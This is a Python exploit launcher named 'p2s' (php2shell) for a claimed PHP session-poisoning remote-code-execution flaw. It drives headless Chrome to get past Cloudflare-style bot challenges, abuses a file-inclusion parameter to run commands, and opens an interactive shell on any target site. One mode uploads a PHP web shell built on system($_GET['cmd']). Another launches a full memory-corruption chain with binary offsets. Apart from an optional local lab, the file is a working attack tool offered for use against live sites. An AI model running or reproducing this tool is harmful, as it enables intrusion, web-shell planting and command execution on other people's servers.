#!/usr/bin/env python3
"""p2s - php2shell, one command.  CVE-2026-109618/9 session-poison RCE.

Everything runs INSIDE a real headless Chrome, so Cloudflare-style bot
challenges / TLS fingerprints are handled like a browser.

  p2s site.nl/index.php            probe, then try the exploit; print result
  p2s site.nl/page.php 'whoami'    exploit with a command, print output
  p2s site.nl/page.php -i          interactive shell
  p2s --lab                        spin the local vulnerable lab and connect
  p2s site.nl --probe              probe only

Common flag: --param NAME (LFI parameter name), --rounds N (default 8).
"""
import atexit
import json
import os
import random
import shutil
import subprocess
import re
from urllib.parse import urlparse
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import bx  # noqa: E402

CHROME_PORT = 9224
PROFILE = "/tmp/p2s-chrome"


def start_chrome():
    if subprocess.run("curl -s -o /dev/null -m 2 http://127.0.0.1:%d/json/version"
                      % CHROME_PORT, shell=True).returncode == 0:
        return True
    if not shutil.which("google-chrome"):
        print("google-chrome not found; install Chrome or use ./p2s with a running Chrome")
        return False
    shutil.rmtree(PROFILE, ignore_errors=True)
    env = dict(os.environ, TMPDIR="/tmp")
    subprocess.Popen(
        ["google-chrome", "--headless=new", "--no-sandbox", "--disable-gpu",
         "--disable-dev-shm-usage", "--disable-quic", "--disable-http2", "--ignore-certificate-errors", "--remote-debugging-port=%d" % CHROME_PORT,
         "--remote-allow-origins=*", "--user-data-dir=" + PROFILE, "about:blank"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env,
        start_new_session=True)
    for _ in range(40):
        if subprocess.run("curl -s -o /dev/null -m 2 http://127.0.0.1:%d/json/version"
                          % CHROME_PORT, shell=True).returncode == 0:
            return True
        time.sleep(0.3)
    print("could not start Chrome")
    return False


def urlize(t):
    t = t.strip().rstrip("/")
    if "://" in t:
        return t
    return "http://" + t


def lab_up():
    subprocess.run("bash %s/lab_fpm.sh >/dev/null 2>&1" % HERE, shell=True)
    return subprocess.run(
        "curl -s -o /dev/null -m 3 http://127.0.0.1:19268/lfi.php", shell=True).returncode == 0


def attempt(c, url, cmd, param, read=""):
    """One exploit round inside the page; returns output or None."""
    sid = "".join(random.choice("0123456789abcdef") for _ in range(32))
    try:
        return c.ev(bx.ATTEMPT_JS % (json.dumps(sid), json.dumps(cmd),
                                     json.dumps(param), json.dumps(bx.PATHS),
                                     json.dumps(read)), 45000)
    except SystemExit as e:
        print("  js error:", e)
        return None


def main():
    a = sys.argv[1:]
    if not a:
        print(__doc__)
        return
    chaina = "--chaina" in a
    fullchain = "--fullchain" in a
    probe_only = "--probe" in a and not chaina
    lab = "--lab" in a
    interactive = "-i" in a or "--interactive" in a
    param = a[a.index("--param") + 1] if "--param" in a else "page"
    read = a[a.index("--read") + 1] if "--read" in a else ""
    rounds = int(a[a.index("--rounds") + 1]) if "--rounds" in a else 8
    # drop values that belong to flags
    target = None
    cmd = "id"
    if lab:
        target = "127.0.0.1:19443/lfi.php"
        read = "/raw.php" if not locals().get("read") else read
    else:
        vals = []
        skip = False
        for i, x in enumerate(a):
            if skip:
                skip = False
                continue
            if x in ("--param", "--rounds", "--save-paths", "--upload", "--read", "--cmd", "--fetch", "--build"):
                skip = True
                continue
            if x.startswith("-"):
                continue
            vals.append(x)
        target = vals[0] if vals else None
        cmd = vals[1] if len(vals) > 1 else "id"
    if not target:
        print(__doc__)
        return
    if lab and not lab_up():
        print("[!] lab failed to start")
        sys.exit(2)
    url = urlize(target)
    if fullchain:
        u = urlparse(url)
        cmdv = a[a.index("--cmd") + 1] if "--cmd" in a else "id>/var/www/html/pwn.txt"
        fetch = a[a.index("--fetch") + 1] if "--fetch" in a else "/pwn.txt"
        build = a[a.index("--build") + 1] if "--build" in a else "php-8.4.26-apache"
        try:
            off = json.load(open(os.path.join(HERE, "offsets.json")))[build]
        except Exception:
            off = {"zif": "0x465370", "dtor": "0x65eb60"}
        argv = [sys.executable, os.path.join(HERE, "fullchain.py"), "--host", u.hostname or "",
                "--port", str(u.port or (443 if u.scheme == "https" else 80)),
                "--path", u.path or "/", "--cmd", cmdv, "--fetch", fetch,
                "--zif-offset", off["zif"], "--dtor-offset", off["dtor"]]
        if u.scheme == "https":
            argv.append("--https")
        sys.exit(subprocess.call(argv))

    if chaina:
        import chaina as CA
        u = urlparse(url)
        lfi = u.path or "/"
        up = a[a.index("--upload") + 1] if "--upload" in a else lfi
        sp = a[a.index("--save-paths") + 1] if "--save-paths" in a else None
        paths = sp.split(",") if sp else CA.SAVE_PATHS
        ok, ev, st = CA.attack("%s://%s" % (u.scheme, u.netloc), lfi, param, up, paths, CA.__dict__.get("DEFAULT_CODE",
            '<?php echo "%s";system($_GET["cmd"]);?>' % CA.MARKER))
        print("upload=%s paths=%d" % (st, len(paths)))
        if not ok:
            print("no hit")
            sys.exit(1)
        print("INCLUDE", ev)
        q = "%s?%s=%s&cmd=%s" % (lfi, param, ev, cmd)
        m = None
        for _ in range(4):
            out = CA.request("%s://%s" % (u.scheme, u.netloc), q).decode("utf8", "replace")
            m = re.search(r"uid=\d+\([^)]*\)[^\n]*", out) or re.search(r"SHELL[^\n]*", out)
            if m:
                break
            time.sleep(0.4)
        print(("SHELL " + m.group(0)) if m else "no shell output")
        sys.exit(0)

    print("[1/3] starting browser ...")
    if not start_chrome():
        sys.exit(2)
    c = bx.CDP()
    c.connect()
    print("[2/3] connecting to %s ..." % url)
    if not bx.setup(c, url):
        print("[!] could not pass the bot challenge on this page")
        sys.exit(3)
    print("      page: %s" % (c.ev("document.title") or "(no title)"))

    if probe_only:
        print("[3/3] probe:", c.ev(bx.PROBE_JS))
        return

    print("[3/3] exploiting (LFI param '%s', up to %d rounds) ..." % (param, rounds))
    for i in range(1, rounds + 1):
        out = attempt(c, url, cmd, param, read)
        print("      round %d: %s" % (iutime if False else i, out or "-"))
        if out:
            print("\n[+] RCE: %s" % out)
            break
    else:
        print("\n[-] no output. Try another page/param, e.g. --param file --rounds 12")
        print("    (the site needs PHP-native sessions + an include() parameter)")
        return

    if interactive:
        print("\ninteractive shell - empty line or Ctrl+D quits")
        while True:
            try:
                q = input("php2shell> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not q:
                return
            out = None
            for _ in range(3):
                out = attempt(c, url, q, param, read)
                if out:
                    break
            print(out or "(no output)")


if __name__ == "__main__":
    main()
